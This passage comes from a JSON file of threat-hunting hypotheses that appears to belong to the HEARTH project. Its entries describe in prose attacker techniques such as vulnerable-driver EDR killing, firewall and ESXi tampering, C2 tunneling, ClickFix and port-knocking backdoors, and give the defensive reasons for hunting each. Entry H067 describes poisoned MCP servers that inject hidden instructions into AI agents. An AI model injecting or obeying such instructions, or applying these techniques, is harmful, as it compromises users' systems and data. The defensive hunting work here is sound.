  },
  {
    "id": "H058",
    "category": "Flames",
    "title": "Threat actors are loading legitimate vulnerable drivers such as ThrottleStop.sys and rwdrv.sys from TechPowerUp to gain kernel-level write access, enabling the subsequent loading and execution of unsigned malicious kernel drivers like hlpdrv.sys that terminate security product processes and services.",
    "tactic": "Privilege Escalation",
    "notes": "Based on ATT&CK technique T1068. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "privilege_escalation",
      "byovd",
      "edr_killer",
      "ransomware",
      "T1068"
    ],
    "techniques": [
      "T1068"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Duc Viet Hoang",
      "link": "https://linkedin.com/in/hvdtsof/"
    },
    "why": "- This Bring Your Own Vulnerable Driver (BYOVD) technique is a critical precursor to ransomware deployment, used by multiple ransomware groups including Akira, Medusa, Qilin, and Crytox to disable endpoint security products before encryption\n- The specific driver combination (ThrottleStop.sys/rwdrv.sys paired with hlpdrv.sys) is a distinctive indicator of Shanya-packed EDR killers, providing high-fidelity detection opportunities with low false positive rates\n- Detecting vulnerable driver loading events allows security teams to intervene before the malicious unsigned driver is loaded and security products are terminated, preventing the subsequent ransomware deployment\n- This technique represents a detection gap as many security tools focus on process-level behaviors rather than kernel driver loading sequences, making it an ideal hunting opportunity",
    "references": "- [MITRE ATT&CK T1068 - Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)\n- [Source CTI Report](https://news.sophos.com/en-us/2025/12/06/inside-shanya-a-packer-as-a-service-fueling-modern-attacks/)",
    "file_path": "Flames/H058.md"
  },
  {
    "id": "H059",
    "category": "Flames",
    "title": "Insiders may be using unauthorised AI chatbot platforms for exfiltration.",
    "tactic": "Exfiltration",
    "notes": "Identify and block unauthorized AI chatbot platforms used for data exfiltration.",
    "tags": [
      "exfiltration",
      "insider",
      "if001_006",
      "if018_002",
      "T1567"
    ],
    "techniques": [
      "T1567"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "samuel-lucas6",
      "link": ""
    },
    "why": "- Reckless sharing on AI chatbot platforms risks exposing sensitive data to the provider. This data could also potentially be used for training or made public via a breach/account compromise.\n- With an account, an insider can transfer sensitive data to a personal device, potentially bypassing other DLP controls (e.g., for email).",
    "references": "- https://insiderthreatmatrix.org/articles/AR4/sections/IF001/subsections/IF001.006\n- https://insiderthreatmatrix.org/articles/AR4/sections/IF018/subsections/IF018.002\n- https://attack.mitre.org/techniques/T1567/\n- https://www.ncsc.gov.uk/blog-post/chatgpt-and-large-language-models-whats-the-risk\n- https://center-for-threat-informed-defense.github.io/insider-threat-ttp-kb/introduction/\n- https://www.cisa.gov/resources-tools/resources/insider-threat-mitigation-guide\n- https://www.ncsc.gov.uk/guidance/reducing-data-exfiltration-by-malicious-insiders",
    "file_path": "Flames/H059.md"
  },
  {
    "id": "H060",
    "category": "Flames",
    "title": "Threat actors may abuse netsh.exe or PowerShell to create, modify, or delete Windows Firewall rules or profiles in order to weaken host-based defenses, permit inbound or outbound communication for malicious tooling, or remove restrictions on command-and-control (C2) traffic. By excluding System integrity level processes, this hypothesis focuses on firewall changes initiated from user or elevated contexts, which are less common during normal operations and more indicative of defense evasion or persistence-related activity.",
    "tactic": "Tactic: Defense Evasion (TA0005) - Technique: Impair Defenses: Disable or Modify System Firewall (T1562.004)",
    "notes": "The hunt focuses on detecting firewall modifications initiated from user or elevated contexts, assuming these are less common during normal operations and more indicative of defense evasion or persistence-related activity.",
    "tags": [
      "netsh",
      "powershell",
      "ta0005",
      "firewall",
      "T1562.004"
    ],
    "techniques": [
      "T1562.004"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "tsof-smoky",
      "link": ""
    },
    "why": "This hunt matters because attackers can temporarily weaken host-based firewall protections to enable command-and-control or payload delivery while leaving little to no persistent evidence. By detecting the act of firewall manipulation rather than the final rule state, defenders can identify stealthy defense-evasion techniques that traditional audits miss. Catching this behavior early helps prevent unauthorized network access, lateral movement, and data exfiltration, reducing overall breach impact.",
    "references": "- https://attack.mitre.org/techniques/T1562/004/\n- https://attack.mitre.org/tactics/TA0005/\n- https://thedfirreport.com/2022/03/21/phosphorus-automates-initial-access-using-proxyshell/\n- https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a",
    "file_path": "Flames/H060.md"
  },
  {
    "id": "H061",
    "category": "Flames",
    "title": "Adversaries are modifying the VIB acceptance level on ESXi hosts using esxcli commands to lower system integrity enforcement from VMwareCertified or VMwareAccepted to CommunitySupported, enabling the installation of unsigned or malicious vSphere Installation Bundles that can establish persistence or deploy backdoors.",
    "tactic": "Defense Evasion",
    "notes": "Based on ATT&CK technique T1562.001. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "defense_evasion",
      "esxi",
      "hypervisor",
      "ransomware",
      "T1562.001"
    ],
    "techniques": [
      "T1562.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "p-o-s-t",
      "link": "https://github.com/p-o-s-t"
    },
    "why": "- Lowering VIB acceptance levels is a critical pre-requisite for attackers to install malicious kernel modules, backdoors, or ransomware components on ESXi hypervisors, directly weakening the system's code integrity protections\n- This technique enables adversaries to bypass VMware's signature verification mechanisms, allowing them to deploy unsigned software that would normally be blocked, which is frequently observed in ESXi-targeted ransomware campaigns\n- ESXi environments are often under-monitored and a single compromised hypervisor can lead to organization-wide impact, as demonstrated by the MGM Resorts incident where over 100 hypervisors were encrypted resulting in $100 million in losses\n- Detecting VIB acceptance level tampering provides an early warning indicator before malicious software installation occurs, giving defenders a critical opportunity to prevent ransomware deployment or persistence establishment",
    "references": "- [MITRE ATT&CK T1562.001 - Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)\n- [Source CTI Report](https://www.splunk.com/en_us/blog/security/detecting-esxi-ransomware-activity-splunk.html)",
    "file_path": "Flames/H061.md"
  },
  {
    "id": "H062",
    "category": "Flames",
    "title": "An adversary is making use of legitimate tunneling service(s) in their malware to bypass firewalls and establish a connection to a command and control server.",
    "tactic": "Command and Control",
    "notes": "Tunneling services like TryCloudflare and Microsoft Dev Tunnels are used for legitimate purposes, their presence is not a strong indicator of malicious activity.",
    "tags": [
      "c2",
      "tunnel",
      "ta0011",
      "t1102",
      "T1572"
    ],
    "techniques": [
      "T1572"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "p-o-s-t",
      "link": "https://github.com/p-o-s-t"
    },
    "why": "- Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and enable access to otherwise unreachable systems.\n- Dev Tunnels (Microsoft) create a secure, tempory URL that maps to a local service running on a machine, which works across firewalls and NAT.\n- Reverse tunneling tools allow software running on an endpoint to establish an outbound connection to the internet-based tunnel provider, who then provides the \"inbound\" path to the client system using the reverse tunnel. This can flip the script on typical taffic behavior.\n- These services may conceal malicious traffic by blending in with existing traffic and provide an outer layer of encryption.",
    "references": "- https://isc.sans.edu/diary/31724\n- https://www.sentinelone.com/labs/operation-digital-eye-chinese-apt-compromises-critical-digital-infrastructure-via-visual-studio-code-tunnels/\n- https://blog.phylum.io/a-deep-dive-into-powerat-a-newly-discovered-stealer-rat-combo-polluting-pypi/\n- https://www.esentire.com/blog/quartet-of-trouble-xworm-asyncrat-venomrat-and-purelogs-stealer-leverage-trycloudflare\n- https://www.proofpoint.com/us/blog/threat-insight/threat-actor-abuses-cloudflare-tunnels-deliver-rats\n- https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/overview\n- https://code.visualstudio.com/docs/remote/tunnels\n- [H036](https://github.com/THORCollective/HEARTH/blob/main/Flames/H036.md)",
    "file_path": "Flames/H062.md"
  },
  {
    "id": "H063",
    "category": "Flames",
    "title": "Adversaries are directly modifying the user-specific TCC.db database file by leveraging Finder's Full Disk Access permissions to programmatically insert authorization entries, bypassing macOS privacy prompts to gain unauthorized access to protected user directories including Desktop, Documents, and Downloads.",
    "tactic": "Defense Evasion",
    "notes": "Based on ATT&CK technique T1562.001. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "defense_evasion",
      "macos",
      "tcc",
      "unc1069",
      "T1562.001"
    ],
    "techniques": [
      "T1562.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "odanh",
      "link": ""
    },
    "why": "- Direct manipulation of the TCC database represents a critical security control bypass that undermines macOS's core privacy framework, allowing malware to operate with elevated privileges without user consent\n- This technique enables unfettered access to sensitive user data including credentials, browser data, messaging applications, and personal documents, directly facilitating the adversary's objective of credential harvesting and financial theft\n- UNC1069's DEEPBREATH malware demonstrates sophisticated understanding of macOS internals by staging the TCC folder rename operation through Finder to exploit its Full Disk Access permissions, making this a distinctive and high-impact technique\n- Detection of TCC database manipulation is critical as it precedes mass data exfiltration activities and represents a point where the attack chain can be interrupted before sensitive data is compromised\n- This technique is particularly dangerous in cryptocurrency and FinTech environments where browser extensions, keychains, and messaging applications contain high-value authentication tokens and credentials",
    "references": "- [MITRE ATT&CK T1562.001 - Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)\n- [Source CTI Report](https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering)",
    "file_path": "Flames/H063.md"
  },
  {
    "id": "H064",
    "category": "Flames",
    "title": "Threat actors are using Punycode-encoded International Domain Names (IDNs) with the \"xn--\" prefix in DNS queries to masquerade visually similar domain names that impersonate legitimate services for credential harvesting and malware delivery.",
    "tactic": "Defense Evasion",
    "notes": "Based on ATT&CK technique T1036.005. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "defense_evasion",
      "punycode",
      "idn",
      "dns",
      "T1036.005"
    ],
    "techniques": [
      "T1036.005"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "DarkWizardCatcher",
      "link": ""
    },
    "why": "- Punycode-encoded IDNs allow attackers to create domains that are visually indistinguishable from legitimate domains (e.g., replacing ASCII \"o\" with Greek \"ο\"), making them highly effective for phishing and malware distribution while evading user detection\n- These domains remain below the radar in many organizations despite their effectiveness, as security teams often don't actively hunt for the \"xn--\" prefix pattern in DNS logs\n- DNS resolver logs provide a goldmine for detecting this technique, as all Punycode domains must use the \"xn--\" prefix format, making them easily identifiable through simple pattern matching\n- Early detection of Punycode domain usage can prevent credential theft, malware infections, and business email compromise before users interact with malicious content",
    "references": "- [MITRE ATT&CK T1036.005 - Masquerading: Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005/)\n- [Source CTI Report](https://isc.sans.edu/diary/Add+Punycode+to+your+Threat+Hunting+Routine/32640/)",
    "file_path": "Flames/H064.md"
  },
  {
    "id": "H065",
    "category": "Flames",
    "title": "An adversary is provisioning virtual machines through the vSphere API or web client targeting VMware virtualization infrastructure to deploy an unmonitored host for credential theft and data exfiltration.",
    "tactic": "Defense Evasion",
    "notes": "Observed in Muddled Libra (Scattered Spider) September 2025 incident. Attackers provisioned a VM named \"New Virtual Machine\" via vSphere within 2 hours of initial access, then used it for 15+ hours as their primary operations host — no EDR coverage.",
    "tags": [
      "defense_evasion",
      "vmware",
      "vsphere",
      "rogue_vm",
      "muddled_libra",
      "T1564.006"
    ],
    "techniques": [
      "T1564.006"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- VMs provisioned by attackers won't have EDR/XDR agents deployed, giving them a completely unmonitored host to run tools, dump credentials, and stage exfiltration from\n- vCenter audit logs capture VM lifecycle events including creation tasks — hunting for VMs created by unexpected users, outside change management windows, or with generic default names can surface rogue infrastructure before lateral movement begins\n- Once a rogue VM exists in the environment, attackers can mount virtual disks (VMDKs) of other VMs, including powered-down domain controllers, to extract sensitive files like NTDS.dit without generating any endpoint telemetry on the target\n- Organizations with broad vCenter permissions or self-service provisioning are at higher risk, as malicious VM creation may blend in with legitimate activity",
    "references": "- [MITRE ATT&CK T1564.006 - Hide Artifacts: Run Virtual Instance](https://attack.mitre.org/techniques/T1564/006/)\n- [Unit 42 - A Peek Into Muddled Libra's Operational Playbook (Feb 2026)](https://unit42.paloaltonetworks.com/muddled-libra-ops-playbook/)",
    "file_path": "Flames/H065.md"
  },
  {
    "id": "H066",
    "category": "Flames",
    "title": "An adversary is deploying malicious browser extensions that impersonate AI productivity tools to steal session tokens and conversation data from AI platforms targeting users of ChatGPT, DeepSeek, and similar services to harvest credentials and exfiltrate sensitive prompt data.",
    "tactic": "Credential Access",
    "notes": "Multiple campaigns in late 2025/early 2026 — 16+ malicious Chrome/Edge extensions stealing ChatGPT session tokens, 900K+ users affected. Extensions clone legitimate tools and add token/conversation exfil under the guise of \"analytics data\" collection.",
    "tags": [
      "credential_access",
      "browser_extension",
      "ai_tokens",
      "chatgpt",
      "session_hijack",
      "T1528",
      "T1185"
    ],
    "techniques": [
      "T1528",
      "T1185"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- Malicious browser extensions requesting broad permissions can access session tokens, authentication cookies, and full conversation content from AI platform tabs without users noticing any change in extension behavior\n- AI platform sessions contain sensitive data beyond just credentials — proprietary code, internal documents pasted into prompts, strategic discussions, and customer data flowing through AI assistants represent high-value exfiltration targets\n- Hunting for unauthorized or recently installed browser extensions that interact with AI platform domains (chat.openai.com, deepseek.com, claude.ai) in endpoint telemetry can surface compromised workstations before session tokens are abused\n- Organizations often lack visibility into which browser extensions employees install, and AI-themed extensions are rapidly proliferating — creating a growing blind spot where credential harvesting can hide behind legitimate-looking productivity tools",
    "references": "- [MITRE ATT&CK T1528 - Steal Application Access Token](https://attack.mitre.org/techniques/T1528/)\n- [MITRE ATT&CK T1185 - Browser Session Hijacking](https://attack.mitre.org/techniques/T1185/)\n- [Malwarebytes - Malicious Chrome Extensions Spy on ChatGPT Chats (Jan 2026)](https://www.malwarebytes.com/blog/news/2026/01/malicious-chrome-extensions-can-spy-on-your-chatgpt-chats)\n- [OX Security - 900K Users Compromised: Chrome Extensions Steal ChatGPT and DeepSeek Conversations (Dec 2025)](https://www.ox.security/blog/malicious-chrome-extensions-steal-chatgpt-deepseek-conversations/)",
    "file_path": "Flames/H066.md"
  },
  {
    "id": "H067",
    "category": "Flames",
    "title": "An adversary is registering typosquatted or trojanized MCP server packages in public registries and package managers targeting developers and AI agents that consume MCP tooling to achieve code execution or data exfiltration through tool poisoning.",
    "tactic": "Initial Access",
    "notes": "First malicious MCP server found on npm in 2025. MCP servers have direct access to AI agents and connected systems — a compromised server can modify tool descriptions between sessions to inject prompts, exfiltrate context, or execute arbitrary code on the host.",
    "tags": [
      "initial_access",
      "mcp",
      "supply_chain",
      "typosquatting",
      "tool_poisoning",
      "ai_agent",
      "T1195.002"
    ],
    "techniques": [
      "T1195.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- MCP servers are distributed through the same package managers (npm, PyPI) already targeted by supply chain attacks, and typosquatted package names can trick developers into installing malicious servers that look identical to trusted ones\n- Unlike traditional supply chain compromises, a malicious MCP server gains direct access to the AI agent's execution context — it can modify tool descriptions to inject hidden instructions, alter tool behavior between sessions, or exfiltrate sensitive data from the agent's conversation history\n- Hunting for recently installed or updated MCP server packages that don't match an approved inventory, or monitoring for tool description changes between agent sessions, can surface compromised tooling before it's used in production\n- The MCP ecosystem currently lacks standardized authentication and package signing, meaning there is no built-in mechanism to verify server integrity — organizations deploying MCP servers are relying entirely on manual vetting",
    "references": "- [MITRE ATT&CK T1195.002 - Supply Chain Compromise: Compromise Software Supply Chain](https://attack.mitre.org/techniques/T1195/002/)\n- [Semgrep - First Malicious MCP Server Found on npm (2025)](https://semgrep.dev/blog/2025/so-the-first-malicious-mcp-server-has-been-found-on-npm-what-does-this-mean-for-mcp-security/)\n- [Noma Security - Top Five MCP Security Blindspots (Nov 2025)](https://noma.security/blog/top-five-mcp-security-blindspots-putting-your-organization-at-risk/)\n- [Docker - MCP Horror Stories: The Supply Chain Attack (Aug 2025)](https://www.docker.com/blog/mcp-horror-stories-the-supply-chain-attack/)",
    "file_path": "Flames/H067.md"
  },
  {
    "id": "H068",
    "category": "Flames",
    "title": "An adversary is bypassing Windows SmartScreen and MSHTML security warnings via crafted links targeting end users to deliver malware without triggering protective prompts",
    "tactic": "Defense Evasion (T1218, T1566.002)",
    "notes": "CVE-2026-21510 (SmartScreen) and CVE-2026-21513 (MSHTML) — both actively exploited zero-days from Feb 2026 Patch Tuesday. CISA KEV deadline March 3. Attackers dismantle warning systems to make social engineering exponentially more effective.",
    "tags": [
      "zerodday",
      "smartscreen",
      "mshtml",
      "defense_evasion",
      "cisa_kev"
    ],
    "techniques": [],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- Two actively exploited zero-days (CVE-2026-21510, CVE-2026-21513) bypass the primary user-facing security warnings in Windows, making phishing dramatically more effective\n- CISA added both to KEV catalog with March 3 patch deadline — signals broad exploitation in the wild\n- Represents a shift in attacker methodology: instead of technical RCE, adversaries are systematically removing security guardrails to amplify social engineering",
    "references": "- [MITRE ATT&CK T1218 - System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/)\n- [MITRE ATT&CK T1566.002 - Phishing: Spearphishing Link](https://attack.mitre.org/techniques/T1566/002/)\n- [WinBuzzer - February 2026 Patch Tuesday: Microsoft Fixes 6 Active Zero-Days](https://winbuzzer.com/2026/02/11/patch-tuesday-microsoft-fixes-6-active-zero-days-xcxwbn/)\n- [MSRC CVE-2026-21510](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-21510)\n- [MSRC CVE-2026-21513](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-21513)",
    "file_path": "Flames/H068.md"
  },
  {
    "id": "H069",
    "category": "Flames",
    "title": "An adversary is abusing the native Windows utility finger.exe by copying and renaming it to a temporary directory to retrieve remote payloads over TCP port 79 targeting enterprise endpoints to establish command and control while evading application controls.",
    "tactic": "Command and Control",
    "notes": "Observed in CrashFix/KongTuke campaign (Jan 2026). finger.exe copied to %TEMP% and renamed to ct.exe to retrieve obfuscated PowerShell payloads. Selectively targets domain-joined machines. Finger protocol (TCP 79) is effectively dead in modern enterprises, making any activity highly anomalous.",
    "tags": [
      "command_and_control",
      "finger_exe",
      "lolbin",
      "crashfix",
      "T1105",
      "T1036.003",
      "T1218"
    ],
    "techniques": [
      "T1105",
      "T1036.003",
      "T1218"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- finger.exe is a native Windows binary that ships with every Windows installation but has virtually no legitimate use in modern enterprise environments — any execution or network connection from this binary is highly anomalous and worth investigating\n- Copying and renaming finger.exe to a temp directory (e.g., ct.exe) evades application allowlists and detection rules that key on the original filename, while the renamed binary retains full functionality to retrieve remote content over TCP 79\n- Outbound TCP port 79 traffic is rarely monitored or included in firewall egress rules because the finger protocol is considered obsolete — attackers exploit this blind spot to retrieve payloads without triggering common network-based detections\n- Hunting for any combination of finger.exe file copies, renamed instances of the binary (by hash), or outbound TCP 79 connections in endpoint and network telemetry provides a high-fidelity, low-noise detection opportunity",
    "references": "- [MITRE ATT&CK T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)\n- [MITRE ATT&CK T1036.003 - Masquerading: Rename System Utilities](https://attack.mitre.org/techniques/T1036/003/)\n- [Microsoft Security Blog - CrashFix: ClickFix Variant Deploying Python RAT (Feb 2026)](https://www.microsoft.com/en-us/security/blog/2026/02/05/clickfix-variant-crashfix-deploying-python-rat-trojan/)\n- [The Hacker News - CrashFix Chrome Extension Delivers ModeloRAT (Jan 2026)](https://thehackernews.com/2026/01/crashfix-chrome-extension-delivers.html)",
    "file_path": "Flames/H069.md"
  },
  {
    "id": "H070",
    "category": "Flames",
    "title": "An adversary is escalating privileges via Windows Remote Desktop Services targeting RDS-enabled servers to gain SYSTEM-level access in post-compromise scenarios",
    "tactic": "Privilege Escalation (T1068)",
    "notes": "CVE-2026-21533 — RDS EoP zero-day discovered by CrowdStrike, actively exploited. Local access required but no user interaction. CISA KEV deadline March 3.",
    "tags": [
      "zeroday",
      "rds",
      "privilege_escalation",
      "cisa_kev",
      "post_compromise"
    ],
    "techniques": [],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- Actively exploited zero-day (CVE-2026-21533) in RDS — ideal for post-compromise privilege escalation on the many servers running Remote Desktop Services\n- No user interaction required once local access is obtained, making it a reliable chain link after initial access via phishing or other vectors\n- RDS is ubiquitous in enterprise environments for remote administration; broad attack surface across most Windows Server deployments",
    "references": "- [MITRE ATT&CK T1068 - Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)\n- [Blackswan Cybersecurity - CVE-2026-21533 Advisory](https://blackswan-cybersecurity.com/threat-advisory-zero-day-windows-remote-desktop-services-elevation-of-privilege-cve-2026-21533-february-11-2026/)\n- [Qualys - February 2026 Patch Tuesday Review](https://blog.qualys.com/vulnerabilities-threat-research/2026/02/10/microsoft-patch-tuesday-february-2026-security-update-review)",
    "file_path": "Flames/H070.md"
  },
  {
    "id": "H071",
    "category": "Flames",
    "title": "An adversary is leveraging the ClickFix social engineering tactic via compromised WordPress sites targeting visitors to trick them into executing malicious commands",
    "tactic": "Execution (T1204.002)",
    "notes": "IClickFix framework identified by Sekoia — widespread WordPress campaign using fake browser/CAPTCHA prompts that instruct users to paste and run PowerShell commands. Uses TDS for targeting.",
    "tags": [
      "clickfix",
      "wordpress",
      "social_engineering",
      "execution",
      "powershell"
    ],
    "techniques": [],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- ClickFix is a rapidly growing social engineering tactic where fake error/CAPTCHA prompts trick users into pasting attacker-supplied commands into Run dialogs or terminals\n- The IClickFix framework industrializes this via a Traffic Distribution System targeting WordPress sites at scale — WordPress powers ~40% of the web\n- Bypasses traditional email-based phishing defenses entirely; the malware delivery happens through legitimate-looking websites the user already trusts",
    "references": "- [MITRE ATT&CK T1204.002 - User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002/)\n- [Sekoia - Meet IClickFix: WordPress-targeting framework using ClickFix](https://blog.sekoia.io/meet-iclickfix-a-widespread-wordpress-targeting-framework-using-the-clickfix-tactic/)\n- [Malware Patrol - Early February 2026 Threat Reports](https://www.malwarepatrol.net/early-february-2026-cyber-threat-reports/)",
    "file_path": "Flames/H071.md"
  },
  {
    "id": "H072",
    "category": "Flames",
    "title": "An adversary is weaponizing WinRAR archive extraction to write malware into the Windows Startup folder targeting users who open phishing attachments to achieve persistence and automatic execution",
    "tactic": "Persistence (T1547.001)",
    "notes": "CVE-2025-8088 — crafted archives extract payloads directly to Startup folder. Actively exploited for ransomware and credential theft. Patch available in WinRAR 7.13.",
    "tags": [
      "winrar",
      "persistence",
      "startup_folder",
      "phishing",
      "cve_2025_8088"
    ],
    "techniques": [],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- Weaponized WinRAR archives silently write payloads into the Windows Startup folder during extraction, achieving persistence without any post-exploitation tooling\n- Actively exploited in the wild for both ransomware deployment and credential theft — two high-impact objectives from a single initial access vector\n- WinRAR has ~500M+ users globally; many run outdated versions, and the fix requires updating to 7.13 which requires manual action",
    "references": "- [MITRE ATT&CK T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)\n- [Check Point Research - 2nd February Threat Intelligence Report](https://research.checkpoint.com/2026/2nd-february-threat-intelligence-report/)\n- [Purple Ops - Daily Ransomware Report 2/2/2026](https://www.purple-ops.io/cybersecurity-threat-intelligence-blog/daily-ransomware-report-2-2-2026/)",
    "file_path": "Flames/H072.md"
  },
  {
    "id": "H073",
    "category": "Flames",
    "title": "An adversary is abusing legitimate cloud storage services as command-and-control channels delivering fileless payloads via weaponized Office documents targeting defense and diplomatic organizations to conduct espionage while evading network-based detection.",
    "tactic": "Command and Control",
    "notes": "Cloud storage C2 blends with legitimate traffic; fileless execution; compromised .gov sender accounts",
    "tags": [
      "command_and_control",
      "cloud_c2",
      "apt28",
      "filen",
      "T1102.002",
      "T1203",
      "T1055"
    ],
    "techniques": [
      "T1102.002",
      "T1203",
      "T1055"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- Cloud storage C2 blends with legitimate traffic and bypasses proxy/firewall allowlists\n- Fileless + memory-only execution leaves zero disk artifacts\n- Spear-phishing from compromised .gov accounts bypasses sender reputation\n- Most orgs have zero visibility into which cloud storage services endpoints communicate with",
    "references": "- [ATT&CK T1102.002](https://attack.mitre.org/techniques/T1102/002/)\n- Trellix research (Feb 2026)\n- CERT-UA UAC-0001",
    "file_path": "Flames/H073.md"
  },
  {
    "id": "H074",
    "category": "Flames",
    "title": "An adversary is creating temporary virtual network interfaces on ESXi-hosted virtual machines to pivot into internal networks and SaaS infrastructure targeting organizations with VMware environments to maintain covert lateral movement channels.",
    "tactic": "Lateral Movement",
    "notes": "UNC6201 ghost NIC technique; temporary vNICs removed after use; minimal forensic evidence",
    "tags": [
      "lateral_movement",
      "defense_evasion",
      "esxi",
      "vmware",
      "ghost_nic",
      "unc6201",
      "T1021",
      "T1497"
    ],
    "techniques": [
      "T1021",
      "T1497"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- UNC6201 created temporary vNICs on existing VMs — removed after use leaving minimal forensic evidence\n- Most SOCs don't monitor ESXi host-level VM config changes\n- Data sources: ESXi hostd.log, vpxa.log, vCenter task events for VirtualDevice.add\n- TTP used since mid-2024 but only publicly reported Feb 2026",
    "references": "- [ATT&CK T1021](https://attack.mitre.org/techniques/T1021/)\n- Mandiant/GTIG UNC6201 (Feb 2026)",
    "file_path": "Flames/H074.md"
  },
  {
    "id": "H075",
    "category": "Flames",
    "title": "An adversary is deploying iptables-based Single Packet Authorization on compromised Linux appliances to create port-knocking backdoors targeting network infrastructure to maintain persistent covert access invisible to standard port scanning.",
    "tactic": "Persistence",
    "notes": "UNC6201 iptables SPA technique; magic hex string on 443; hidden backdoor port for 5 minutes",
    "tags": [
      "persistence",
      "defense_evasion",
      "iptables",
      "port_knocking",
      "spa",
      "unc6201",
      "T1205.001",
      "T1562.004"
    ],
    "techniques": [
      "T1205.001",
      "T1562.004"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- UNC6201 deployed iptables rules listening for magic hex string on 443, redirecting to hidden backdoor port for 5 minutes — standard scanners never see it\n- SPA/port-knocking rarely hunted in production\n- Look for iptables recent module or hex-string matches\n- Any appliance with these rules deserves immediate investigation",
    "references": "- [ATT&CK T1205.001](https://attack.mitre.org/techniques/T1205/001/)\n- Mandiant/GTIG UNC6201 (Feb 2026)",
    "file_path": "Flames/H075.md"
  },
  {
    "id": "H076",
    "category": "Flames",
    "title": "An adversary is claiming expired domains and deployment URLs of abandoned Microsoft Office add-ins to serve credential phishing pages inside Outlook targeting enterprise users who have stale add-ins installed to harvest Microsoft 365 credentials at scale.",
    "tactic": "Initial Access",
    "notes": "First malicious Outlook add-in in the wild; abandoned AgreeTo add-in reclaimed; 4000+ creds stolen; approve-once-trust-forever gap",
    "tags": [
      "initial_access",
      "credential_access",
      "outlook",
      "office_addin",
      "supply_chain",
      "agreetosteal",
      "T1195.002",
      "T1056.002",
      "T1114"
    ],
    "techniques": [
      "T1195.002",
      "T1056.002",
      "T1114"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jinx (THOR Collective)",
      "link": ""
    },
    "why": "- First documented malicious Outlook add-in in the wild — 4,000+ credentials stolen via abandoned \"AgreeTo\" add-in whose Vercel URL was reclaimed by attacker\n- Office add-ins load content live from developer URLs with NO re-review after initial approval — \"approve once, trust forever\" gap\n- Add-ins with ReadWriteItem permissions can silently read/modify ALL user emails — credential theft was the least damaging option\n- Same attack class as browser extension takeovers and npm package hijacking, but inside the M365 trust boundary",
    "references": "- [ATT&CK T1195.002](https://attack.mitre.org/techniques/T1195/002/)\n- [ATT&CK T1056.002](https://attack.mitre.org/techniques/T1056/002/)\n- Koi Security — AgreeToSteal (Feb 2026)",
    "file_path": "Flames/H076.md"
  },
  {
    "id": "H077",
    "category": "Flames",
    "title": "An adversary is creating unauthorized virtual network interface cards on VMware ESXi hosts to establish covert network paths targeting virtualized infrastructure to pivot laterally while evading network-based detection.",
    "tactic": "Lateral Movement",
    "notes": "UNC6201 Ghost NICs bridge isolated segments; combined with iptables SPA for C2; vNIC changes often unmonitored",
    "tags": [
      "lateral_movement",
      "defense_evasion",
      "esxi",
      "vmware",
      "ghost_nic",
      "unc6201",
      "T1021",
      "T1599",
      "T1049"
    ],
    "techniques": [
      "T1021",
      "T1599",
      "T1049"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
